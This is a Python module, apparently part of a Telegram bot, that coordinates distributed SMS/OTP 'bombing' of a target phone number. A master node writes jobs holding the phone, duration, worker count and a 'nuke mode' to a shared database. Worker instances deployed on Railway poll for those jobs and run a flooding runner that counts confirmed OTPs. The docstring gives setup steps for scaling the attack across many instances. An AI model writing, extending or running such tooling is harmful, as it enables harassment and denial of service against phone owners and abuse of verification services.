from __future__ import annotations

"""
Distributed bombing coordinator.

How it works:
- Each Railway instance is a "node" with a unique NODE_ID env variable
- Master node (NODE_ID=master) coordinates attacks
- Worker nodes poll the DB for jobs every 5 seconds and execute them
- Admin uses /nodes command to see all active nodes
- Admin uses the Distributed Nuke button to send a job to ALL nodes simultaneously

Setup:
1. Deploy multiple Railway instances of the same bot
2. Set NODE_ID=master on one, NODE_ID=worker1, NODE_ID=worker2 etc on others
3. All share the same TURSO_URL and TURSO_TOKEN
4. Admin controls everything from the master bot

Each node shares the same DB so they all see the same jobs.
"""

import asyncio
import os
import time
import logging
import json

logger = logging.getLogger(__name__)

NODE_ID      = os.getenv("NODE_ID", "master")
IS_MASTER    = NODE_ID == "master"
POLL_INTERVAL = 5.0   # seconds between job polls


async def registerNode(db) -> None:
    """Register this node as active in the DB."""
    try:
        db.setSetting(f"node_{NODE_ID}_heartbeat", str(time.time()))
        db.setSetting(f"node_{NODE_ID}_id", NODE_ID)
    except Exception:
        pass


async def nodeHeartbeatLoop(db) -> None:
    """Keep this node's heartbeat alive so master knows it's online."""
    while True:
        try:
            db.setSetting(f"node_{NODE_ID}_heartbeat", str(time.time()))
        except Exception:
            pass
        await asyncio.sleep(30)


def getActiveNodes(db) -> list:
    """Get all nodes that have sent a heartbeat in the last 2 minutes."""
    now     = time.time()
    nodes   = []
    cutoff  = now - 120  # 2 minutes
    # Find all node heartbeat keys
    try:
        # We store node IDs in a special key
        nodeList = db.getSetting("node_list", "[]")
        ids      = json.loads(nodeList)
        for nid in ids:
            hb = db.getSetting(f"node_{nid}_heartbeat", "0")
            if float(hb) > cutoff:
                nodes.append(nid)
    except Exception:
        pass
    return nodes


async def registerNodeId(db) -> None:
    """Add this node to the node list."""
    try:
        nodeList = db.getSetting("node_list", "[]")
        ids      = json.loads(nodeList)
        if NODE_ID not in ids:
            ids.append(NODE_ID)
            db.setSetting("node_list", json.dumps(ids))
    except Exception:
        pass


def dispatchJob(db, phone: str, duration: int, workers: int, nukeMode: bool = False) -> str:
    """
    Master dispatches a bombing job to all worker nodes via DB.
    Returns job ID.
    """
    jobId = f"job_{int(time.time())}"
    job   = {
        "id":       jobId,
        "phone":    phone,
        "duration": duration,
        "workers":  workers,
        "nukeMode": nukeMode,
        "created":  time.time(),
        "status":   "pending",
    }
    db.setSetting(f"distributed_job_{jobId}", json.dumps(job))
    db.setSetting("distributed_latest_job", jobId)
    return jobId


async def workerJobLoop(db, bot) -> None:
    """
    Worker nodes poll for new jobs and execute them.
    """
    lastJobId = None

    while True:
        await asyncio.sleep(POLL_INTERVAL)
        try:
            jobId = db.getSetting("distributed_latest_job", "")
            if not jobId or jobId == lastJobId:
                continue

            jobStr = db.getSetting(f"distributed_job_{jobId}", "")
            if not jobStr:
                continue

            job = json.loads(jobStr)
            if job.get("status") != "pending":
                continue

            # Mark as running for this node
            lastJobId = jobId
            logger.info(f"Node {NODE_ID} executing distributed job {jobId}")

            # Execute the bombing job
            from bot.services.tester_runner import TesterRunner
            runner = TesterRunner(
                phone=job["phone"],
                duration=job["duration"],
                workers=job["workers"],
                useProxy=False,
                nukeMode=job.get("nukeMode", False),
            )
            await runner.start()

            # Wait for completion
            while runner.isRunning:
                await asyncio.sleep(2)

            snap = runner.stats.snapshot()
            logger.info(
                f"Node {NODE_ID} finished job {jobId} — "
                f"{snap['totalReqs']} reqs, {snap['confirmed']} OTPs"
            )

        except Exception as e:
            logger.error(f"Node {NODE_ID} job loop error: {e}")


async def startDistributed(db, bot) -> None:
    """Start all distributed coordination tasks."""
    await registerNodeId(db)
    await registerNode(db)
    asyncio.create_task(nodeHeartbeatLoop(db))
    if not IS_MASTER:
        asyncio.create_task(workerJobLoop(db, bot))
        logger.info(f"Distributed worker node started: {NODE_ID}")
    else:
        logger.info(f"Distributed master node started: {NODE_ID}")